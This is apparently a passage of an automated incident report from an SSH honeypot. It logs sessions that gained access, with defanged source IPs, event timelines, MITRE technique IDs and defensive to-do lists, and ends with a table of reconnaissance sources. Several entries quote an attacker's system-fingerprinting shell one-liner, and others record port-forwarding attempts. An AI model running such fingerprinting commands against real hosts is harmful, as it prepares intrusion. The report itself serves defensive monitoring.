| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 09:38:28` | `cowrie.session.connect` |
| `2026-08-03 09:38:28` | `cowrie.client.version` |
| `2026-08-03 09:38:28` | `cowrie.client.kex` |
| `2026-08-03 09:38:29` | `cowrie.login.success` |
| `2026-08-03 09:38:30` | `cowrie.session.params` |
| `2026-08-03 09:38:30` | `cowrie.command.input` |
| `2026-08-03 09:38:30` | `cowrie.command.input` |
| `2026-08-03 09:38:30` | `cowrie.command.input` |
| `2026-08-03 09:38:30` | `cowrie.command.input` |
| `2026-08-03 09:38:30` | `cowrie.command.input` |
| `2026-08-03 09:38:30` | `cowrie.command.success` |
| `2026-08-03 09:38:30` | `cowrie.command.input` |
| `2026-08-03 09:38:30` | `cowrie.command.input` |
| `2026-08-03 09:38:30` | `cowrie.command.input` |
| `2026-08-03 09:38:30` | `cowrie.command.input` |
| `2026-08-03 09:38:31` | `cowrie.log.closed` |
| `2026-08-03 09:38:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4140364cedee

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-03 09:40 |
| **Last Seen** | 2026-08-03 09:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 09:40:42` | `cowrie.session.connect` |
| `2026-08-03 09:40:42` | `cowrie.client.version` |
| `2026-08-03 09:40:42` | `cowrie.client.kex` |
| `2026-08-03 09:40:43` | `cowrie.login.success` |
| `2026-08-03 09:40:43` | `cowrie.direct-tcpip.request` |
| `2026-08-03 09:40:43` | `cowrie.direct-tcpip.data` |
| `2026-08-03 09:40:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-faae0edf2ea8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 09:41 |
| **Last Seen** | 2026-08-03 09:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 09:41:00` | `cowrie.session.connect` |
| `2026-08-03 09:41:00` | `cowrie.client.version` |
| `2026-08-03 09:41:00` | `cowrie.client.kex` |
| `2026-08-03 09:41:01` | `cowrie.login.success` |
| `2026-08-03 09:41:03` | `cowrie.session.params` |
| `2026-08-03 09:41:03` | `cowrie.command.input` |
| `2026-08-03 09:41:03` | `cowrie.command.input` |
| `2026-08-03 09:41:03` | `cowrie.command.input` |
| `2026-08-03 09:41:03` | `cowrie.command.input` |
| `2026-08-03 09:41:03` | `cowrie.command.input` |
| `2026-08-03 09:41:03` | `cowrie.command.success` |
| `2026-08-03 09:41:03` | `cowrie.command.input` |
| `2026-08-03 09:41:03` | `cowrie.command.input` |
| `2026-08-03 09:41:03` | `cowrie.command.input` |
| `2026-08-03 09:41:03` | `cowrie.command.input` |
| `2026-08-03 09:41:03` | `cowrie.log.closed` |
| `2026-08-03 09:41:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1f77881cb31

| Field | Detail |
|---|---|
| **Source IP** | `58.22.255[.]28` |
| **First Seen** | 2026-08-03 09:41 |
| **Last Seen** | 2026-08-03 09:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 09:41:50` | `cowrie.session.connect` |
| `2026-08-03 09:41:51` | `cowrie.client.version` |
| `2026-08-03 09:41:51` | `cowrie.client.kex` |
| `2026-08-03 09:41:53` | `cowrie.login.success` |
| `2026-08-03 09:41:54` | `cowrie.direct-tcpip.request` |
| `2026-08-03 09:41:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.22.255[.]28` to AbuseIPDB if not already reported
- [ ] Block `58.22.255[.]28` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b692ac79008

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 09:43 |
| **Last Seen** | 2026-08-03 09:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 09:43:16` | `cowrie.session.connect` |
| `2026-08-03 09:43:16` | `cowrie.client.version` |
| `2026-08-03 09:43:16` | `cowrie.client.kex` |
| `2026-08-03 09:43:17` | `cowrie.login.success` |
| `2026-08-03 09:43:18` | `cowrie.session.params` |
| `2026-08-03 09:43:18` | `cowrie.command.input` |
| `2026-08-03 09:43:18` | `cowrie.command.input` |
| `2026-08-03 09:43:18` | `cowrie.command.input` |
| `2026-08-03 09:43:18` | `cowrie.command.input` |
| `2026-08-03 09:43:18` | `cowrie.command.input` |
| `2026-08-03 09:43:18` | `cowrie.command.success` |
| `2026-08-03 09:43:18` | `cowrie.command.input` |
| `2026-08-03 09:43:18` | `cowrie.command.input` |
| `2026-08-03 09:43:18` | `cowrie.command.input` |
| `2026-08-03 09:43:18` | `cowrie.command.input` |
| `2026-08-03 09:43:19` | `cowrie.log.closed` |
| `2026-08-03 09:43:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f4032f695ef

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 09:47 |
| **Last Seen** | 2026-08-03 09:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 09:47:33` | `cowrie.session.connect` |
| `2026-08-03 09:47:33` | `cowrie.client.version` |
| `2026-08-03 09:47:33` | `cowrie.client.kex` |
| `2026-08-03 09:47:35` | `cowrie.login.success` |
| `2026-08-03 09:47:36` | `cowrie.session.params` |
| `2026-08-03 09:47:36` | `cowrie.command.input` |
| `2026-08-03 09:47:36` | `cowrie.command.input` |
| `2026-08-03 09:47:36` | `cowrie.command.input` |
| `2026-08-03 09:47:36` | `cowrie.command.input` |
| `2026-08-03 09:47:36` | `cowrie.command.input` |
| `2026-08-03 09:47:36` | `cowrie.command.success` |
| `2026-08-03 09:47:36` | `cowrie.command.input` |
| `2026-08-03 09:47:36` | `cowrie.command.input` |
| `2026-08-03 09:47:36` | `cowrie.command.input` |
| `2026-08-03 09:47:36` | `cowrie.command.input` |
| `2026-08-03 09:47:37` | `cowrie.log.closed` |
| `2026-08-03 09:47:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-787d9b7ac29d

| Field | Detail |
|---|---|
| **Source IP** | `122.187.237[.]122` |
| **First Seen** | 2026-08-03 09:49 |
| **Last Seen** | 2026-08-03 09:49 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 09:49:19` | `cowrie.session.connect` |
| `2026-08-03 09:49:19` | `cowrie.client.version` |
| `2026-08-03 09:49:19` | `cowrie.client.kex` |
| `2026-08-03 09:49:21` | `cowrie.login.success` |
| `2026-08-03 09:49:22` | `cowrie.direct-tcpip.request` |
| `2026-08-03 09:49:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.187.237[.]122` to AbuseIPDB if not already reported
- [ ] Block `122.187.237[.]122` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35a0ac5bf4e5

| Field | Detail |
|---|---|
| **Source IP** | `213.234.9[.]218` |
| **First Seen** | 2026-08-03 09:51 |
| **Last Seen** | 2026-08-03 09:51 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 09:51:37` | `cowrie.session.connect` |
| `2026-08-03 09:51:38` | `cowrie.client.version` |
| `2026-08-03 09:51:38` | `cowrie.client.kex` |
| `2026-08-03 09:51:39` | `cowrie.login.success` |
| `2026-08-03 09:51:39` | `cowrie.direct-tcpip.request` |
| `2026-08-03 09:51:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.234.9[.]218` to AbuseIPDB if not already reported
- [ ] Block `213.234.9[.]218` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdc970dee320

| Field | Detail |
|---|---|
| **Source IP** | `110.164.201[.]73` |
| **First Seen** | 2026-08-03 09:55 |
| **Last Seen** | 2026-08-03 09:55 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 09:55:09` | `cowrie.session.connect` |
| `2026-08-03 09:55:10` | `cowrie.client.version` |
| `2026-08-03 09:55:10` | `cowrie.client.kex` |
| `2026-08-03 09:55:11` | `cowrie.login.success` |
| `2026-08-03 09:55:12` | `cowrie.direct-tcpip.request` |
| `2026-08-03 09:55:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.164.201[.]73` to AbuseIPDB if not already reported
- [ ] Block `110.164.201[.]73` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41edbe7d9df9

| Field | Detail |
|---|---|
| **Source IP** | `117.70.94[.]155` |
| **First Seen** | 2026-08-03 09:55 |
| **Last Seen** | 2026-08-03 09:55 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 09:55:18` | `cowrie.session.connect` |
| `2026-08-03 09:55:18` | `cowrie.client.version` |
| `2026-08-03 09:55:18` | `cowrie.client.kex` |
| `2026-08-03 09:55:22` | `cowrie.login.success` |
| `2026-08-03 09:55:23` | `cowrie.direct-tcpip.request` |
| `2026-08-03 09:55:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.70.94[.]155` to AbuseIPDB if not already reported
- [ ] Block `117.70.94[.]155` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e32122a0abde

| Field | Detail |
|---|---|
| **Source IP** | `111.39.206[.]23` |
| **First Seen** | 2026-08-03 10:16 |
| **Last Seen** | 2026-08-03 10:16 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 10:16:34` | `cowrie.session.connect` |
| `2026-08-03 10:16:35` | `cowrie.client.version` |
| `2026-08-03 10:16:35` | `cowrie.client.kex` |
| `2026-08-03 10:16:39` | `cowrie.login.success` |
| `2026-08-03 10:16:40` | `cowrie.direct-tcpip.request` |
| `2026-08-03 10:16:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.39.206[.]23` to AbuseIPDB if not already reported
- [ ] Block `111.39.206[.]23` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee69d46b27c1

| Field | Detail |
|---|---|
| **Source IP** | `116.114.94[.]242` |
| **First Seen** | 2026-08-03 10:26 |
| **Last Seen** | 2026-08-03 10:26 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 10:26:09` | `cowrie.session.connect` |
| `2026-08-03 10:26:09` | `cowrie.client.version` |
| `2026-08-03 10:26:09` | `cowrie.client.kex` |
| `2026-08-03 10:26:11` | `cowrie.login.success` |
| `2026-08-03 10:26:11` | `cowrie.direct-tcpip.request` |
| `2026-08-03 10:26:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.114.94[.]242` to AbuseIPDB if not already reported
- [ ] Block `116.114.94[.]242` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd1ac4867a45

| Field | Detail |
|---|---|
| **Source IP** | `36.137.38[.]119` |
| **First Seen** | 2026-08-03 10:26 |
| **Last Seen** | 2026-08-03 10:26 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 10:26:22` | `cowrie.session.connect` |
| `2026-08-03 10:26:24` | `cowrie.client.version` |
| `2026-08-03 10:26:24` | `cowrie.client.kex` |
| `2026-08-03 10:26:26` | `cowrie.login.success` |
| `2026-08-03 10:26:26` | `cowrie.direct-tcpip.request` |
| `2026-08-03 10:26:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.137.38[.]119` to AbuseIPDB if not already reported
- [ ] Block `36.137.38[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e434221490b

| Field | Detail |
|---|---|
| **Source IP** | `45.178.227[.]0` |
| **First Seen** | 2026-08-03 10:26 |
| **Last Seen** | 2026-08-03 10:26 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 10:26:26` | `cowrie.session.connect` |
| `2026-08-03 10:26:27` | `cowrie.client.version` |
| `2026-08-03 10:26:27` | `cowrie.client.kex` |
| `2026-08-03 10:26:28` | `cowrie.login.success` |
| `2026-08-03 10:26:29` | `cowrie.direct-tcpip.request` |
| `2026-08-03 10:26:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.178.227[.]0` to AbuseIPDB if not already reported
- [ ] Block `45.178.227[.]0` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-772ef7fceba8

| Field | Detail |
|---|---|
| **Source IP** | `37.25.36[.]197` |
| **First Seen** | 2026-08-03 10:29 |
| **Last Seen** | 2026-08-03 10:30 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 10:29:58` | `cowrie.session.connect` |
| `2026-08-03 10:29:58` | `cowrie.client.version` |
| `2026-08-03 10:29:58` | `cowrie.client.kex` |
| `2026-08-03 10:29:59` | `cowrie.login.success` |
| `2026-08-03 10:30:00` | `cowrie.direct-tcpip.request` |
| `2026-08-03 10:30:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.25.36[.]197` to AbuseIPDB if not already reported
- [ ] Block `37.25.36[.]197` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da0dd0ebb6eb

| Field | Detail |
|---|---|
| **Source IP** | `65.20.204[.]41` |
| **First Seen** | 2026-08-03 10:34 |
| **Last Seen** | 2026-08-03 10:34 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 10:34:41` | `cowrie.session.connect` |
| `2026-08-03 10:34:41` | `cowrie.client.version` |
| `2026-08-03 10:34:41` | `cowrie.client.kex` |
| `2026-08-03 10:34:42` | `cowrie.login.success` |
| `2026-08-03 10:34:43` | `cowrie.direct-tcpip.request` |
| `2026-08-03 10:34:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.204[.]41` to AbuseIPDB if not already reported
- [ ] Block `65.20.204[.]41` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f5ef245d7d8

| Field | Detail |
|---|---|
| **Source IP** | `175.198.18[.]3` |
| **First Seen** | 2026-08-03 10:34 |
| **Last Seen** | 2026-08-03 10:35 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 10:34:53` | `cowrie.session.connect` |
| `2026-08-03 10:34:55` | `cowrie.client.version` |
| `2026-08-03 10:34:55` | `cowrie.client.kex` |
| `2026-08-03 10:34:59` | `cowrie.login.success` |
| `2026-08-03 10:35:01` | `cowrie.direct-tcpip.request` |
| `2026-08-03 10:35:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.198.18[.]3` to AbuseIPDB if not already reported
- [ ] Block `175.198.18[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5942a9b0aba8

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-03 10:41 |
| **Last Seen** | 2026-08-03 10:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 10:41:55` | `cowrie.session.connect` |
| `2026-08-03 10:41:55` | `cowrie.client.version` |
| `2026-08-03 10:41:55` | `cowrie.client.kex` |
| `2026-08-03 10:41:55` | `cowrie.login.success` |
| `2026-08-03 10:41:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa4145b9dba0

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-03 10:41 |
| **Last Seen** | 2026-08-03 10:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 10:41:55` | `cowrie.session.connect` |
| `2026-08-03 10:41:55` | `cowrie.client.version` |
| `2026-08-03 10:41:55` | `cowrie.client.kex` |
| `2026-08-03 10:41:56` | `cowrie.login.success` |
| `2026-08-03 10:41:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d796c2c7043f

| Field | Detail |
|---|---|
| **Source IP** | `27.107.102[.]154` |
| **First Seen** | 2026-08-03 10:51 |
| **Last Seen** | 2026-08-03 10:51 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 10:51:19` | `cowrie.session.connect` |
| `2026-08-03 10:51:20` | `cowrie.client.version` |
| `2026-08-03 10:51:20` | `cowrie.client.kex` |
| `2026-08-03 10:51:21` | `cowrie.login.success` |
| `2026-08-03 10:51:22` | `cowrie.direct-tcpip.request` |
| `2026-08-03 10:51:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.107.102[.]154` to AbuseIPDB if not already reported
- [ ] Block `27.107.102[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `91.233.83[.]203` | **10** | 2026-08-03 06:55 | 2026-08-03 10:50 | 9m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **6** | 2026-08-03 07:04 | 2026-08-03 09:17 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]167` | **6** | 2026-08-03 07:27 | 2026-08-03 09:16 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.156.128[.]56` | **6** | 2026-08-03 08:50 | 2026-08-03 08:51 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]123` | **6** | 2026-08-03 10:11 | 2026-08-03 10:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.227.254[.]154` | **3** | 2026-08-03 08:53 | 2026-08-03 08:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `71.6.167[.]142` | **3** | 2026-08-03 09:34 | 2026-08-03 09:34 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.238.181[.]92` | **3** | 2026-08-03 07:48 | 2026-08-03 07:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | **2** | 2026-08-03 09:39 | 2026-08-03 10:02 | 0m | 0 | `T1592` | 🟢 LOW |
| `144.123.15[.]82` | **2** | 2026-08-03 07:13 | 2026-08-03 07:15 | 2m | 0 | `T1592` | 🟢 LOW |
| `16.58.56[.]214` | **2** | 2026-08-03 09:02 | 2026-08-03 09:03 | 0m | 0 | `T1592` | 🟢 LOW |
| `173.255.221[.]189` | **2** | 2026-08-03 07:36 | 2026-08-03 08:35 | 0m | 0 | `T1592` | 🟢 LOW |
| `208.109.212[.]211` | **2** | 2026-08-03 07:18 | 2026-08-03 07:58 | 1m | 0 | `T1592` | 🟢 LOW |
